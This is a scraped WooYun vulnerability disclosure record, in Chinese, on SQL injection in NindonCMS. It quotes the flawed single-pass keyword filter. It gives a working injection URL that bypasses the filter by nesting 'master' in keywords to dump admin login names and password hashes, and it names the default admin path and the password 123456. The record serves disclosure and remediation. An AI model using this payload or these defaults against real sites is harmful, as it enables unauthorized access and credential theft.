{"id": 58820, "wybug_id": "wooyun-2014-049510", "wybug_title": "NindonCMS存在sql注入漏洞", "wybug_corp": "NindonCMS", "wybug_author": "YMSZ07", "wybug_date": "2014-01-22 13:56", "wybug_open_date": "2014-03-08 13:57", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["用户敏感信息泄漏", "注入过滤不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-03-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： NindonCMS系统对访问者提交的数据参数过滤不严，导致攻击者可以随时提交构造好的SQL语句查询数据库获取敏感信息。同时，系统默认后台地址也相当容易暴露。 详细说明：  由于NindonCMS系统是基于开源ASPCMS开发，所以如果开发人员在开发过程中不注意，则会导致很多现在已经补上的ASPCMS漏洞在二次开发的CMS系统上重现。这个漏洞源于ASPCMS系统，但是既然是做二次开发，就应该尽力去弥补安全上的不足。其原理很明确：NindonCMS在处理浏览器提交的数据时使用filterPara函数过滤，这个函数接着调用了PreventSqlin和Checkxss两个函数进行字符过滤，PreventSqlin用来过滤SQL注入语句，而Checkxss是用来过滤跨站输入。关键就是在PreventSqlin函数 /inc/AspCms_CommonFun.asp函数内容如下：　　Function preventSqlin(content)　　dim sqlStr,sqlArray,i,speStr　　sqlStr=”<|>|%|%27|’|”　|;|*|and|exec|dbcc|alter|drop|insert|select|update|delete|count|master|truncate|char|declare|where|set|declare|mid|chr” ‘这是函数要过滤的SQL关键词　　if isNul(content) then Exit Function　　sqlArray=split(sqlStr,”|”) ‘用符号将其分割成数组　　for i=lbound(sqlArray) to ubound(sqlArray)　　if instr(lcase(content),sqlArray(i))<>0 then　　select case sqlArray(i)　　case “<”:speStr=”<” case “>”:speStr=”>”　　case “‘”,”\"”\":speStr=”\"”　　‘case “;”:speStr=”；”　　case else:speStr=”\"　　end select ‘如果出现了 < > ‘ “ ; 则将其HTML转义　　content=replace(content,sqlArray(i),speStr,1,-1,1) ‘如果出现关键字则将其替换为空。　　end if　　next　　preventSqlin=content　　End Function　　该函数乍看的确是安全的，但是还有一种情况就是用户提交的是类似于SELECT的但是包含过滤字符,当多余的字符被过滤掉之后反而形成一个SELECT关键字，这个基本同于ASPCMS的SQL注入漏洞问题，实际上应该用循环匹配替换。   漏洞证明：  尝试多个NindonCMS系统，都会爆出来，而且默认密码还是一个最常见的123456假设测试网站地址为：http://www.xyz.com   （同时确实是nindonCMS系统）可以构造注入语句，比如此种EXPhttp://www.xyz.com/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user返回结果如图：\n\n再加上这个系统默认后台是：http://www.xyz.com/system所以攻击者要获得后台超级管理员登录权限很容易。   修复方案：  对于开发者来说：应该调整过滤策略，用循环匹配替换。对于普通使用者：拿到网站后记得及时修改超级用户的密码，最好是使用相当复杂的密码，这样即使爆出md5值，要在cmd5网站上跑出密码也需要相当长的时间。   版权声明：转载请注明来源 YMSZ07@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}